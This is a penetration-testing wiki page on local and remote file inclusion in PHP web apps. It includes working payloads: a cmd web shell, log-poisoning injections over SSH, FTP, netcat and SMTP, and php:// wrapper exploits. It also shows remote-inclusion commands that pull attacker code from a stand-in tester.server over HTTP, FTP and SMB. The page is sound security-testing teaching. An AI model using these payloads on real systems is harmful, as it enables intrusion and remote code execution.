# 🛠️ File inclusion

## Theory

Many web applications manage files and use server-side scripts to include them. When input parameters (cookies, GET or POST parameters) used in those scripts are insufficiently validated and sanitized, these web apps can be vulnerable to file inclusion.

LFI/RFI (Local/Remote File Inclusion) attacks allow attackers to read sensitive files, include local or remote content that could lead to RCE (Remote Code Execution) or to client-side attacks such as XSS (Cross-Site Scripting).

[Directory traversal](directory-traversal.md) (a.k.a. path traversal, directory climbing, backtracking, the dot dot slash attack) attacks allow attackers to access sensitive files on the file system, outside the web server directory. File inclusion attacks can leverage a directory traversal vulnerability to include files with a relative path.

## Practice

Testers need to identify input vectors (parts of the app that accept content from the users) that could be used for file-related operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.

* **Local File Inclusion**: inclusion of a local file (in the webserver directory) using an absolute path
* **LFI + directory traversal**: inclusion of a local file (in the webserver directory or not) by "climbing" the server tree with `../` (relative path)
* **Remote File Inclusion**: inclusion of a remote file (not on the server) using a URI

The tool [dotdotpwn](https://github.com/wireghoul/dotdotpwn) (Perl) can help in finding and exploiting directory traversal vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient.

```bash
# With a request file where /?argument=TRAVERSAL (request file must be in /usr/share/dotdotpwn)
dotdotpwn.pl -m payload -h $RHOST -x $RPORT -p $REQUESTFILE -k "root:" -f /etc/passwd

# Generate a wordlist in STDOUT that can be used by other fuzzers (ffuf, gobuster...)
dotdotpwn -m stdout -d 5
```

The tool [kadimus](https://github.com/P0cL4bs/Kadimus) (C) can help in finding and exploiting File Inclusion vulnerabilities. However, manual testing is usually more efficient.

```bash
kadimus --user-agent "PENTEST" -u '$URL/?parameter=value'
```

Depending on the environment, file inclusions can sometimes lead to RCE (Remote Code Execution) by including a local file containing code previously injected by the attacker or a remote file containing code that the server can execute.

Local file inclusions can sometimes be combined with other vulnerabilities to achieve code execution

* directory traversal
* null-byte injection
* unrestricted file upload
* log poisoning

Once an attacker is able to execute code on a target, testing the limitations of that code execution can help to go from code execution (e.g. PHP, ASPX, etc.) to command execution (e.g. Linux or Windows commands).

With PHP as example, the tester can create a `phpinfo.php` containing `<?php phpinfo(); ?>` and use a simple HTTP server so that the target application can fetch it. When exploiting the RFI to include the `phpinfo.php` file, the tester server will send the plaintext PHP code to the target server that should execute the code and show the `phpinfo` in the response.

{% hint style="warning" %}
If the tester server used to host the `phpinfo.php` file can interpret PHP, it will. The tester will not achieve code execution on the target server but on his own instead. A simple HTTP server will do.
{% endhint %}

```bash
# Create phpinfo.php
echo '<?php phpinfo(); ?>' > phpinfo.php

# Start a web server
python3 -m http.server 80

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=http://tester.server/phpinfo.php'
```

If the phpinfo has been successfully printed in the response, the tester can engage a more offensive approach by trying to execute commands with one of the following payloads.

{% hint style="info" %}
As code execution functions can be filtered, the phpinfo testing phase is required to assert that arbitrary PHP code is included and interpreted.
{% endhint %}

```php
<?php system('whoami'); ?>
```

```php
<?php exec('whoami'); ?>
```

```php
<?php passthru('whoami'); ?>
```

```php
<?php shell_exec('whoami'); ?>
```

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

### LFI to RCE (via logs poisoning)

{% hint style="warning" %}
Log files may be stored in different locations depending on the operating system/distribution.
{% endhint %}

#### /var/log/auth.log

For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth.log`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.

```bash
# Sending the payload via SSH
ssh '<?php phpinfo(); ?>'@$TARGET

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
```

#### /var/log/vsftpd.log

When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload (depending on which web technology is used).

```bash
# Sending the payload via FTP
ftp $TARGET_IP
> '<?php system($_GET['cmd'])?>'

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id
```

#### var/log/apache2/access.log

When the web application is using an Apache 2 server, the `access.log` may be accessible using an LFI.

* **About `access.log`**: records all requests processed by the server.
* **About netcat**: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
```

{% hint style="info" %}
There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `access.log` path and file depending on the operating system/distribution:

> * RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: `/var/log/httpd/access_log`
> * Debian / Ubuntu Linux Apache access log file location: `/var/log/apache2`/access.log
> * FreeBSD Apache access log file location: `/var/log/httpd-access.log`
> * Windows Apache access log file location: **** `C:\xampp\apache\logs`

Or if the web server is under Nginx :

> * Linux Nginx access log file location: `/var/log/nginx/access.log`
> * Windows Nginx access log file location: `C:\nginx\log`
{% endhint %}

#### /var/log/apache/error.log

This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.

* **About `error.log`**: records any errors encountered in processing requests.
* **About netcat**: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
```

{% hint style="info" %}
There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `error.log` path and file depending on the operating system/distribution:

* RHEL / Red Hat / CentOS / Fedora Linux Apache error file location: `/var/log/httpd/error_log`
* Debian / Ubuntu Linux Apache error log file location: `/var/log/apache2/error.log`
* FreeBSD Apache error log file location: `/var/log/httpd-error.log`
* Windows Apache access log file location: **** `C:\xampp\apache\logs`

Or if the web server is under Nginx :&#x20;

* Linux Nginx access log file location: `/var/log/nginx`
* Windows Nginx access log file location: `C:\nginx\log`
{% endhint %}

#### **/var/log/mail.log**

When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet (as an example).

```bash
# Sending the payload via telnet
telnet $TARGET_IP $TARGET_PORT
> MAIL FROM:<pentest@pentest.com>
> RCPT TO:<?php system($_GET['cmd']); ?>

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/mail.log&cmd=id
```

### 🛠️ LFI to RCE (via phpinfo)

### 🛠️ LFI to RCE (via file upload)

### LFI to RCE (via php wrappers)

#### Data wrapper

```bash
# Shell in base64 encoding
echo '<?php system($_GET['cmd']); ?>' | base64

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id
```

{% hint style="warning" %}
The attribute `allow_url_include` should be set. \
This configuration can be checked in the `php.ini` file.
{% endhint %}

#### Input wrapper

```bash
# Testers should make sure to change the $URL
curl -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
```

{% hint style="warning" %}
The attribute `allow_url_include` should be set. \
This configuration can be checked in the `php.ini` file.
{% endhint %}

#### Zip wrapper

{% hint style="info" %}
The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
{% endhint %}

```bash
echo '<?php system($_GET['cmd']); ?>' > payload.php
zip payload.zip payload.php

# Accessing the log file via LFI (the # identifier is URL-encoded)
curl --user-agent "PENTEST" $URL/?parameter=zip://payload.zip%23payload.php&cmd=id
```

#### 🛠️ Phar wrapper

### 🛠️ LFI to RCE (via /proc)

#### /proc/self/environ

Testers can abuse a process created due to a request. The payload is injected in the `User-Agent` header.

```bash
# Sending a request to $URL with a malicious user-agent
# Accessing the payload via LFI
curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../proc/self/environ
```

#### 🛠️ /proc/\*/fd

### 🛠️ LFI to RCE (via PHP session)

When a web server wants to handle sessions, it can use PHP session cookies (PHPSESSID).

#### Reconnaissance

1.  Finding where the sessions are stored.

    Examples:

    * `/var/lib/php5/sess_[PHPSESSID]`
    * `/var/lib/php/sessions/sess_[PHPSESSID]`
2.  Displaying a PHPSESSID to see if any parameter is reflected inside.

    Example:

    * The user name for the session (from a parameter called `user`)

#### RCE

```bash
login=1&user=<?php system("id");?>&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_$PHPSESSID
```

### RFI to RCE (via HTTP)

//

### RFI to RCE (via FTP)

The tester can also host his arbitrary PHP code and access it through the **FTP** protocol. He can use the python library **pyftpdlib** to start a FTP server.

```bash
# Start FTP server
sudo python3 -m pyftpdlib -p 21                                                                                                                                            1 ↵ alex@ubuntu
[I 2022-07-11 00:04:26] concurrency model: async
[I 2022-07-11 00:04:26] masquerade (NAT) address: None
[I 2022-07-11 00:04:26] passive ports: None
[I 2022-07-11 00:04:26] >>> starting FTP server on 0.0.0.0:21, pid=176948 <<<

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=ftp://tester.server/phpinfo.php'
```

{% hint style="info" %}
PHP uses the **anonymous** credentials to authenticate to the FTP server. If the tester needs to use custom credentials, he can authenticate as follows : &#x20;

<mark style="color:blue;">`curl '$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php'`</mark>
{% endhint %}

### RFI to RCE (via SMB)

Sometimes, the vulnerable web application is hosted on a **Windows Server,** meaning the attacker could log into a **SMB Server** to store the arbitrary PHP code.&#x20;

[Impacket](https://github.com/SecureAuthCorp/impacket)'s [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) (Python) script can be used on the attacker-controlled machine to create a SMB Server.&#x20;

```
sudo python3 smbserver.py -smb2support share $(pwd)                                                                                        130 ↵ alex@ubuntu
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

The PHP script can then be included by using a [UNC](https://en.wikipedia.org/wiki/Universal\_Naming\_Convention) Path.

```bash
curl '$URL/?parameter=\\tester.server\phpinfo.php'
```

## References

{% embed url="https://www.acunetix.com/websitesecurity/directory-traversal" %}

{% embed url="https://portswigger.net/web-security/file-path-traversal" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.html" %}
Directory traversal and File Include
{% endembed %}

{% embed url="https://owasp.org/www-community/attacks/Path_Traversal" %}
Testing for Directory traversal
{% endembed %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion.html" %}
Testing for Remote File Inclusion
{% endembed %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.html" %}
Testing for Local File Inclusion
{% endembed %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}
